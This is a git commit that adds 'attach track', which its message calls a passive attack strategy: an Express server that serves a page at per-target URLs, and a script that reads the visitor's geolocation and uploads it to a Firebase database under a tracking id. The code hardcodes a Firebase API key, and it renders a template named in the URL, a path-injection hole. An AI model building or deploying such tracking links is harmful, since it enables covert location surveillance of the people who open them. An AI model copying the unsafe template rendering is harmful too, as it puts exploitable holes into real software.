8374d9068e233be69e3533cca723ebb5494345d5
Abhishek Agrawal <abhishekagrawal8888@gmail.com>
2020-08-02 20:04:09 +0530

    Added a new passive attack strategy

---
+++ attach track/app.js
@@ -0,0 +1,46 @@
+const express = require('express')
+const app = express()
+
+PORT = process.env.IP || 3000;
+process.env.FIREBASE_CLIENT_EMAIL = ""
+process.env.FIREBASE_PRIVATE_KEY =""
+
+// app.initializeApp({
+//     credential: app.credential.cert({
+//       "private_key": process.env.FIREBASE_PRIVATE_KEY,
+//       "client_email": process.env.FIREBASE_CLIENT_EMAIL,
+//     }),
+//     databaseURL: "https://my-firebase-app.firebaseio.com"
+//   });
+
+
+app.use(express.static('public'))
+app.use(express.static('public/images'))
+app.use(express.static('public/shopping'))
+
+
+
+
+
+app.set('view engine','ejs');
+
+app.get('/', (req,res) => {
+    res.render("index")
+})
+
+app.get('/:key', (req,res) => {
+    // req.session.key = key 
+   key = req.params['key']
+//    res.send("key",req.session.key)
+       res.render("index",{key:key})
+})
+
+app.get('/:page/:key', (req,res) => {
+    const page = req.params["page"]
+        res.render(`${page}`)
+})
+
+
+
+
+app.listen(PORT,() => console.log("server started"))
---
+++ attach track/public/index.js
@@ -0,0 +1,62 @@
+
+//Firebase init 
+
+var firebaseConfig = {
+  apiKey: "AIzaSyBghW9N54DAOpj2De3sKwO8SBcAxFQPX6M",
+  authDomain: "auxiliarsweb.firebaseapp.com",
+  databaseURL: "https://auxiliarsweb.firebaseio.com",
+  projectId: "auxiliarsweb",
+  storageBucket: "auxiliarsweb.appspot.com",
+  messagingSenderId: "855340108370",
+  appId: "1:855340108370:web:f9d1302479536fae28ad8b",
+  measurementId: "G-XHJY4JZFN4"
+};
+var hre = window.location.href;
+// console.log(hre)
+  var id  = hre.split('/').pop()
+console.log(id)
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+
+
+  var database = firebase.database();
+
+
+  function go(){
+    console.log("re")
+  firebase.database().ref('Tracking/' + id +"/").set({
+    "Id":id || "cr123",
+	"currLocation": currLocation
+  });
+}
+
+let currLocation = []
+function success(position) {
+
+    const latitude  = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    currLocation = [ longitude,latitude ]
+    console.log(currLocation)
+    go();
+  }
+
+  
+
+  function error() {
+    currLocation = [0,0]
+  }
+
+
+
+  if(!navigator.geolocation) {
+    currLocation = [-1,-1];
+  } else {
+    navigator.geolocation.getCurrentPosition(success, error);
+    
+  }
+
+  
+
+
+
